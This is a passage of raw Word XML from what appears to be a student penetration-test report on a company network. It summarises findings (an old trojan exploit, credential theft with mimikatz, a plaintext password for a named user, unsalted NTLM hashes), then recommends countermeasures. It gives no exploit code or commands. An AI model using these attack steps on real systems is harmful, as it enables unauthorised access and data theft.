          <w:p w14:paraId="39F8E6EC" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>A plaintext password should be hashed, otherwise it can be used to access its parent account</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3188" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CBFCA12" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows a hacker to access that </w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t>users</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> account allowing them to </w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t xml:space="preserve">gain and use whatever </w:t>
            </w:r>
            <w:r w:rsidR="00A0250F">
              <w:t>privileges</w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t xml:space="preserve"> that user may have</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D7205BC" w14:textId="77777777" w:rsidR="007A5B94" w:rsidRDefault="007A5B94" w:rsidP="007A5B94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2832"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A52BBA3" w14:textId="77777777" w:rsidR="007A5B94" w:rsidRDefault="007A5B94" w:rsidP="007A5B94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="158"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12F53ADA" w14:textId="77777777" w:rsidR="007A5B94" w:rsidRDefault="009D2D53" w:rsidP="009D2D53">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>All of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> these vulnerabilities were detected by the penetration tester in around 25 hours. It is important to note that </w:t>
      </w:r>
      <w:r w:rsidR="00516210">
        <w:t>a malicious hacker would, if they are committed to an attack, will likely have a far longer amount of time to spend on breaching the system. In the time the penetration tester was given they managed to exploit the servers using an old trojan</w:t>
      </w:r>
      <w:r w:rsidR="006E1215">
        <w:t>, using an exploit which has since been patched on the latest versions of Windows MSB servers</w:t>
      </w:r>
      <w:r w:rsidR="00516210">
        <w:t>, then further gained access to the administrator’s passwords through using several tools and was able to access a large directory full of data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DF807B" w14:textId="77777777" w:rsidR="00516210" w:rsidRDefault="00516210" w:rsidP="00516210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D50CCDE" w14:textId="77777777" w:rsidR="00A0250F" w:rsidRDefault="00516210" w:rsidP="00516210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This data did include employee names and included customer details. These are protected by the General Data Protection Regulations Act and could result in large fine should these details be leaked online. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD046DA" w14:textId="77777777" w:rsidR="00A0250F" w:rsidRDefault="00A0250F" w:rsidP="00A0250F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="043AE9BF" w14:textId="77777777" w:rsidR="00516210" w:rsidRDefault="00A0250F" w:rsidP="00516210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>However, it should be noted that the admins account was found through a plug in called mimikatz and would perhaps be secure otherwise, and unless the hacker breaks down the password before the index/install.php page an injection attack might not work (appendix a)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632601FA" w14:textId="77777777" w:rsidR="007A5B94" w:rsidRDefault="007A5B94" w:rsidP="007A5B94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="158"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4426B980" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="158"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CA729A3" w14:textId="77777777" w:rsidR="006E1215" w:rsidRPr="004B7E63" w:rsidRDefault="009525A9" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc27518409"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Countermeasures</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
      <w:r w:rsidR="00927DC9">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F5064A" w14:textId="77777777" w:rsidR="00E15DD4" w:rsidRDefault="006E1215" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t>A transfer of the entire domain should be moved to servers where the operating systems of every server and client running should be upgraded. This would eliminate any possibility of the same type of exploits explained above, as well as eliminate</w:t>
      </w:r>
      <w:r w:rsidR="00E15DD4">
        <w:t xml:space="preserve"> anything that was brought over in the transfer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FF27EF" w14:textId="77777777" w:rsidR="00E15DD4" w:rsidRDefault="00E15DD4" w:rsidP="00E15DD4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Intrusion detection should be implemented, the network failed to lock out several intrusive scans and an even an unauthorized user accessing the admin account. This would give an early warning </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>if and when</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a hacker breaches the security surrounding the network and/or administrator/ user account, or if traffic through the network begins to look suspicious, as a hacker may be, for example, downloading large files of customer information out of the network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAC00F9" w14:textId="77777777" w:rsidR="006939AB" w:rsidRDefault="00E15DD4" w:rsidP="006939AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t>Review where and how passwords are stored. A plaintext password for a user (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>T.Oliver</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">) was found on the active directory. This should not, in any circumstance, have happened. To have such a password visible on the directory could lead to that user being vulnerable to an escalation of privileges, saving a hacker time and effort trying to hard code their way into a directory. </w:t>
      </w:r>
      <w:r w:rsidR="007C2536">
        <w:t>Furthermore,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="007C2536">
        <w:t xml:space="preserve">singular </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cracked hash of a password </w:t>
      </w:r>
      <w:r w:rsidR="00976C51">
        <w:t xml:space="preserve">was found to be </w:t>
      </w:r>
      <w:r w:rsidR="007C2536">
        <w:t xml:space="preserve">hashed </w:t>
      </w:r>
      <w:r w:rsidR="00976C51">
        <w:t>using windows NTLM hashing, which uses the MD4 algorithm which is known to be unsecure</w:t>
      </w:r>
      <w:r w:rsidR="00F159A5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00976C51">
        <w:t>and does not salt the passwor</w:t>
      </w:r>
      <w:r w:rsidR="007C2536">
        <w:t>d. This again saves a hacker time and effort trying to decrypt a password as the way it was hashed is faulty. Perhaps even more concerningly, the password was the administrators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAE21C0" w14:textId="77777777" w:rsidR="006939AB" w:rsidRPr="009525A9" w:rsidRDefault="006939AB" w:rsidP="006939AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Anti-virus should be installed. If it had been then it should have detected the well known trojan and immediately threw up all types of alerts. Without it the system is left completely vulnerable to worms, trojans, viruses and bacteria. </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Should any of the these get a grip on the system the amount of damage they could inflict on the company may be enough to shut it down. Without Anti-Virus, all types of avenues open for a malicious program to enter the system, even without the direction by a hacker. For instance, sometimes an ordinary user on the website may decide to unwittingly upload a compromised file to the website, and from there the malicious program inside can use the website to spread even further around the internet. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C51C607" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc27518410"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Conclusions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="0826B704" w14:textId="77777777" w:rsidR="00FF4D2E" w:rsidRDefault="00FF4D2E" w:rsidP="00FF4D2E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5047B7F8" w14:textId="77777777" w:rsidR="00FF4D2E" w:rsidRDefault="000705A8" w:rsidP="00FF4D2E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By implementing </w:t>
      </w:r>
      <w:r w:rsidR="006939AB">
        <w:t xml:space="preserve">stronger security </w:t>
      </w:r>
      <w:r w:rsidR="00D505A3">
        <w:t>methods,</w:t>
      </w:r>
      <w:r w:rsidR="006939AB">
        <w:t xml:space="preserve"> the safer the network and the users who rely on it will be from cyber-attacks.</w:t>
      </w:r>
      <w:r w:rsidR="00D505A3">
        <w:t xml:space="preserve"> The safer the company is from cyber-attacks, the safer its users will be, which will mean the company can stop worrying about paying fines as the result of poor security practices.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6982AD" w14:textId="77777777" w:rsidR="00D505A3" w:rsidRDefault="00D505A3" w:rsidP="00D505A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CC72207" w14:textId="77777777" w:rsidR="00D505A3" w:rsidRDefault="00D505A3" w:rsidP="00FF4D2E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t>Failure to do so could result in all types of things that could cripple a company’s reputation and bank balance. Customers who wish to use the company’s services are ward off by poor reputations, and when a possible client knows their data is not in safe hands their impression of a company may become far more negative.  This trend is also shared by the eyes of the law, and its numerous watchdogs. When a company looks as if its attempting to play down their security issues, or even play down just how serious a data breach was the penalty for doing so can become far greater than what might have originally been given.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E715810" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D4C187B" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="00FF4D2E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t>In summary, the better the protection on the network, the better the user experience for everyone will be. This network does not possess adequate protection to protect against an attack and should be updated as soon as possible to avoid a potential data breach.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B540923" w14:textId="77777777" w:rsidR="00D505A3" w:rsidRPr="004B7E63" w:rsidRDefault="009525A9" w:rsidP="00D505A3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc27518411"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Future Work</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="61EF777A" w14:textId="77777777" w:rsidR="00D505A3" w:rsidRDefault="00D505A3" w:rsidP="00D505A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Given more time the penet</w:t>
      </w:r>
      <w:r w:rsidR="00AF1CF0">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ration tester would have tried to exploit the php related issues. This is because the amount of issues with the php server were numerous and there simply was not enough time to explore every avenue of attack. The attacks for the version of php and WebCalendar are well known and numerous, and every type of exploit should have been tried to get an idea of what the worst-case scenario for the breach into the company’s systems could have been. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC77596" w14:textId="77777777" w:rsidR="00AF1CF0" w:rsidRDefault="00AF1CF0" w:rsidP="00AF1CF0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10F6D569" w14:textId="77777777" w:rsidR="00AF1CF0" w:rsidRPr="00AF1CF0" w:rsidRDefault="00AF1CF0" w:rsidP="00AF1CF0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Another part of the penetration test should have perhaps included designing a response to a certain attack to mitigate its impact. By having an action plan drawn up for several possibilities staff will know what to do in the event of a breach. This will speed up the company’s recovery and will save time and money, as damage can be limited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6865CF6B" w14:textId="77777777" w:rsidR="00BC7FA6" w:rsidRDefault="00BC7FA6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24D33781" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="004B7E63" w:rsidRDefault="00BC7FA6" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc27518412"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>call to action</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="56051E76" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>There are many free trials out there for cyber security, but none are like an Abertay Hacker. The Abertay hacker comes complete with a full background knowledge in cyber security and will stop at nothing until your security flaws have analyzed and patched.</w:t>
      </w:r>
      <w:r w:rsidR="004956A5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> They also come with many great ideas such as how to run a penetration test against your system and how to stop others doing it. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6E8377" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33B6239B" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A full </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>30 day</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> trial of the Abertay Hacker can be found at </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D80ADB3" w14:textId="77777777" w:rsidR="004956A5" w:rsidRPr="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C94954C" w14:textId="77777777" w:rsidR="004956A5" w:rsidRPr="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004956A5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>AbertayHacker.full_free_trial@aberhacker.co.uk</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="26" w:name="_Toc27518413" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="566773658"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Bibliographies"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="6B308CC0" w14:textId="77777777" w:rsidR="006E34CB" w:rsidRDefault="00341658" w:rsidP="00341658">
          <w:pPr>
            <w:pStyle w:val="Heading1"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="0"/>
            </w:numPr>
            <w:ind w:left="431"/>
          </w:pPr>
          <w:r>
            <w:t>References</w:t>
          </w:r>
          <w:bookmarkEnd w:id="26"/>
        </w:p>
        <w:sdt>
          <w:sdtPr>
            <w:id w:val="-573587230"/>
            <w:bibliography/>
          </w:sdtPr>
          <w:sdtContent>
            <w:p w14:paraId="4094A39A" w14:textId="77777777" w:rsidR="003B009F" w:rsidRDefault="003B009F" w:rsidP="009525A9">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
                <w:rPr>
                  <w:b/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00866889">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:t>For URLs</w:t>
              </w:r>
              <w:r w:rsidR="009924C9">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:t>, Blogs</w:t>
              </w:r>
              <w:r w:rsidRPr="00866889">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:t>:</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="21551C8B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
              <w:pPr>
                <w:spacing w:after="236"/>
                <w:ind w:right="919"/>
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
              </w:pPr>
              <w:hyperlink r:id="rId36" w:anchor="media-list-document-document-all_ml_0" w:history="1">
                <w:r>
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://www.airbus.com/newsroom/press-releases/en/2018/01/airbus-2018-price-list-press-release.html#media-list-document-document-all_ml_0</w:t>
                </w:r>
              </w:hyperlink>
            </w:p>
            <w:p w14:paraId="5934D2EA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
              <w:pPr>
                <w:spacing w:after="236"/>
                <w:ind w:right="919"/>
              </w:pPr>
              <w:r w:rsidRPr="00ED2F72">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:color w:val="auto"/>
                  <w:u w:val="none"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="auto"/>
                  <w:u w:val="none"/>
                </w:rPr>
                <w:t>Accessed 15.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5A8C53B7" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
              <w:pPr>
                <w:spacing w:after="236"/>
                <w:ind w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId37" w:history="1">
                <w:r w:rsidRPr="00A52896">
                  <w:rPr>
                    <w:color w:val="0000FF"/>
                    <w:u w:val="single"/>
                  </w:rPr>
                  <w:t>https://www.bbc.co.uk/news/business-48905907</w:t>
                </w:r>
              </w:hyperlink>
            </w:p>
            <w:p w14:paraId="54748538" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
              <w:pPr>
                <w:spacing w:after="236"/>
                <w:ind w:right="919"/>
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="auto"/>
                  <w:u w:val="none"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00ED2F72">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:color w:val="auto"/>
                  <w:u w:val="none"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="auto"/>
                  <w:u w:val="none"/>
                </w:rPr>
                <w:t>Accessed 15.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="1527AB35" w14:textId="77777777" w:rsidR="001E3C1D" w:rsidRDefault="001E3C1D" w:rsidP="00ED2F72">
              <w:pPr>
                <w:spacing w:after="236"/>
                <w:ind w:right="919"/>
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="auto"/>
                  <w:u w:val="none"/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="2DDFDF61" w14:textId="77777777" w:rsidR="001E3C1D" w:rsidRPr="00ED2F72" w:rsidRDefault="001E3C1D" w:rsidP="00ED2F72">
              <w:pPr>
                <w:spacing w:after="236"/>
                <w:ind w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId38" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://nmap.org/nsedoc/categories/vuln.html</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> [Accessed 15.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="00895EE3" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
              <w:pPr>
                <w:ind w:right="919"/>
                <w:rPr>
                  <w:b/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="3109EB5B" w14:textId="77777777" w:rsidR="00337545" w:rsidRPr="00337545" w:rsidRDefault="00337545" w:rsidP="00337545">
              <w:pPr>
                <w:spacing w:after="0"/>
              </w:pPr>
              <w:hyperlink r:id="rId39" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://github.com/gentilkiwi/mimikatz/releases</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> [Accessed 16.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="6496C113" w14:textId="77777777" w:rsidR="00337545" w:rsidRDefault="00337545" w:rsidP="009525A9">
